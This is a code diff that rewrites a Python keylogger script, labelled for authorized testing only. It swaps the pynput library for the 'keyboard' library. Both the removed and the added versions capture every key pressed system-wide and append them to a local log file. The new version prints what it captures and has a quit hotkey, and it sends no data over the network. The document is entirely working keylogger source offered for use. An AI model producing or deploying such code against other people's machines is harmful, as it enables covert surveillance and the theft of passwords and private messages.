@@ -1,47 +1,38 @@
 #!/usr/bin/env python3
 # keylogger.py – For personal/authorized testing only.
 
-from pynput.keyboard import Key, Listener
+import keyboard
 
-keys = []
-
-
-def on_press(key):
-    keys.append(key)
-    write_file(keys)
-
-    try:
-        print('alphanumeric key {0} pressed'.format(key.char))
-    except AttributeError:
-        print('special key {0} pressed'.format(key))
+LOGFILE = "log.txt"
 
 
-def write_file(keys):
-    # 'a+' mode leaves the new file open for appending
-    with open('log.txt', 'a+') as f:
-        for key in keys:
-            # Removing '' from the key string
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                # Adding new line for readability
-                f.write('\n')
-            elif k.find("key") == -1:
-                f.write(k)
-            else:
-                # Special keys in square brackets
-                f.write(f'[{k}]')
-            # Adding a space after each key for readability
-            f.write(' ')
-        keys.clear()  # Clearing the keys list after writing to the file
+def write_log(text):
+    with open(LOGFILE, "a", encoding="utf-8") as f:
+        f.write(text)
 
 
-def on_release(key):
-    print('{0} released'.format(key))
-    if key == Key.esc:
-        # Stop listener
-        return False
+def on_key(event):
+    name = event.name
 
+    if len(name) == 1:
+        log = name
+    elif name == "space":
+        log = " "
+    elif name == "enter":
+        log = "\n"
+    else:
+        log = f"[{name}]"
 
-# Collecting events until released
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+    print(f"Key: {repr(log)}")
+    write_log(log)
+
+# Start recording
+keyboard.on_press(on_key)
+
+print("Keylogger started. Press ctrl + shift + q to quit.")
+
+# Hotkey to stop the script
+keyboard.add_hotkey("ctrl+shift+q", lambda: exit())
+
+# Wait forever
+keyboard.wait()
